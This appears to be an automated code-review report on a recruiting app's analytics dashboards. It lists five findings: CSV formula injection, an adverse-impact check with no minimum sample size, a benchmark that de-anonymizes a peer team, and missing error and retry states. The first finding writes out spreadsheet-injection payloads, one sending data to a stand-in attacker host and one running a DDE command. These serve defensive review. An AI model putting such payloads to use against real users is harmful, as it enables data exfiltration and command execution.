# Analytics & Calibration Dashboards — bug-hunter + ui-perfectionist scan

> Context: Funnel analytics, decision logs/records, spend/target tracking, score calibration, momentum/forecast/bottleneck deltas, source analytics, and the new cross-company benchmark + adverse-impact primitives.
> Files reviewed: 17 of 26
> Total: 5

## 1. CSV export lets a candidate-controlled name inject spreadsheet formulas

- **Severity**: High
- **Lens**: bug-hunter
- **Category**: validation-gap / injection
- **File**: `app/_lib/export-utils.ts:10-16` (root cause), `app/features/sub_analytics/DecisionLog.tsx:127-140`, `app/features/sub_analytics/AnalyticsTab.tsx:355-361`
- **Scenario**: A candidate applies through an inbound channel with a display name like `=HYPERLINK("http://evil.example/"&A1,"click")` or `=cmd|'/c calc'!A1`. That string is stored as `candidate_label`, surfaces in the decision log, and a recruiter clicks "Export CSV". `toCsv` emits the field verbatim (it only quotes cells containing `",`\r\n`), so on open in Excel/Sheets/LibreOffice the cell is evaluated as a formula.
- **Root cause**: `toCsv` is "RFC 4180-ish" — it escapes the *delimiter* set but never neutralizes the *formula* trigger characters (`= + - @`, tab, CR). The design treats CSV as a pure text format, ignoring that spreadsheet apps auto-execute leading-operator cells (CWE-1236). `candidateLabel`, `jobTitle`, and `detail` all originate from untrusted inbound data.
- **Impact**: Data exfiltration / DDE command execution on the recruiter's machine, or hidden links in an audit export — from merely applying to a job. Same `toCsv` backs every CSV export in the app.
- **Fix sketch**: In `toCsv`, prefix any cell whose first char is `= + - @` (or tab/CR) with a `'` (or wrap in quotes with a leading `'`), then apply the existing delimiter quoting. One change makes the whole class impossible for every caller.

## 2. Four-fifths adverse-impact check has no minimum-sample floor and renders a legally-loaded verdict from noise

- **Severity**: High
- **Lens**: bug-hunter
- **Category**: edge-case / misleading-authority (legal exposure)
- **File**: `app/_lib/adverse-impact.ts:67-104`, consumer `app/features/sub_decisions/ComplianceSection.tsx:90,186-215`
- **Scenario**: A recruiter pastes small counts into the compliance check, e.g. `A,1,1` / `B,40,50` / `C,30,50`. `computeAdverseImpact` picks the highest-rate group **A (100%, n=1)** as the reference, so C's ratio is 0.60 and the panel prints a bold coral **"Adverse impact"** verdict. Remove the 1-person group and the reference becomes B — the verdict flips. The whole legal conclusion pivots on a single applicant.
- **Root cause**: The function clamps denominators and guards divide-by-zero correctly, but has **no minimum-cohort gate** — unlike its siblings `calibration.ts` (`MIN_CALIBRATION_OUTCOMES = 20`) and `salary-benchmark.ts` (`SALARY_BENCHMARK_MIN_COHORT = 3`). The EEOC four-fifths rule is statistically meaningless below an adequate sample, yet any group with `total > 0` can become the reference and any ratio `< 0.8` is asserted as "adverse" with no confidence caveat.
- **Impact**: The tool lends four-fifths authority to samples where the rule doesn't apply; a recruiter may act on (or memorialize) a false "adverse impact" or false "OK" finding — a compliance/legal-defensibility hazard on the app's fairness surface.
- **Fix sketch**: Add a min total-N and min per-group-N threshold (mirror the calibration/salary gates); exclude sub-threshold groups from being the reference, and surface a "sample too small to assess" state instead of a hard verdict. Return a `reliable: boolean` the UI must honor before showing coral/green.

## 3. Org hiring benchmark de-anonymizes a lone peer team

- **Severity**: Medium
- **Lens**: bug-hunter
- **Category**: trust-boundary / k-anonymity
- **File**: `app/_lib/db/org-benchmarks.ts:81-106`, route `app/api/benchmarks/route.ts:13-18`
- **Scenario**: `KP_MULTI_WORKSPACE` is on and an org has exactly two teams (the caller + one peer). `/api/benchmarks` calls `orgHiringBenchmark(orgId)` with no `excludeWorkspaceId`, so the aggregate spans **the caller's own team plus the one peer**, and `contributingTeams` (2) clears `BENCHMARK_MIN_TEAMS`. The caller already knows their own stats via `teamHiringStats`, so subtracting them from the "org" aggregate backs out the single peer team's figures (modulo rounding).
- **Root cause**: The k-anonymity floor counts the caller's own team toward the "≥2 teams" guarantee. The module's stated invariant — "an org benchmark is never a window onto ONE other team" — fails because with self included, a 2-team org *is* exactly that window. The `excludeWorkspaceId` "vs peers" mode that would fix it exists but the route never uses it.
- **Impact**: One sibling team's aggregate hiring rates leak within the org, contradicting the module's explicit privacy claim; also dilutes the "ahead/behind" comparison (a team is partly compared against itself).
- **Fix sketch**: Require `contributingTeams >= BENCHMARK_MIN_TEAMS + 1` when the caller's team is included, OR have the route call `orgHiringBenchmark(orgId, { excludeWorkspaceId })` so "the org" always excludes the caller and the floor covers only unknown teams.

## 4. [STILL-OPEN] Calibration & Decision-Records fetch errors are non-actionable dead ends

- **Severity**: Medium
- **Lens**: ui-perfectionist
- **Category**: missing-ui-state / a11y
- **File**: `app/features/sub_analytics/CalibrationPanel.tsx:147-150`, `app/features/sub_analytics/DecisionRecordsPanel.tsx:83-86`
- **Scenario**: `/api/analytics/calibration` or `/api/decisions/records` returns a transient 500. Both panels render `<p role="status">{t("error")}</p>` — no retry — even though `useJsonFetch` returns a `reload()` (confirmed at `useJsonFetch.ts:15,57`) that these two destructure away (`{ data, error }` only). Still open from the 2026-06-20 report #1; the sibling `DecisionLog` DOES wire a retry button.
- **Root cause**: The error branch discards the available `reload` and uses `role="status"` (polite) for an error, which should be `role="alert"` (assertive). Divergence from the established retry pattern in the same tab.
- **Impact**: A user hitting a transient failure is stuck on a static message until a full-page reload; screen readers don't announce the error assertively. Still matters because these are the "honesty"/audit panels users most need to recover.
- **Fix sketch**: Destructure `reload` and render the same retry button `DecisionLog`/`AnalyticsTab` use; switch the error `<p>` to `role="alert"`.

## 5. OrgBenchmarkPanel silently vanishes on fetch error, collapsing three distinct states into one blank

- **Severity**: Low
- **Lens**: ui-perfectionist
- **Category**: missing-ui-state
- **File**: `app/features/sub_analytics/OrgBenchmarkPanel.tsx:56-59`
- **Scenario**: `/api/benchmarks` fails (500, offline). `useJsonFetch` sets `error`, but the panel only reads `{ data }` and does `if (!data) return null` — so the section renders nothing. A persistent load failure is now visually identical to "still loading" and to the by-design `!org.available` locked state, with no message and no retry.
- **Root cause**: The "secondary panel — stay silent until the payload lands" choice conflates *loading* with *error*; the error path is never surfaced. New panel, not covered by the prior scan.
- **Impact**: Users can't tell whether the company benchmark is loading, unavailable (too few teams), or broken. On a real error the feature just disappears with no way to recover short of a full reload.
- **Fix sketch**: Destructure `error`; render a compact inline error with a `reload()` retry (matching the tab's pattern) distinct from the locked/empty state, so the three states are visually separable.
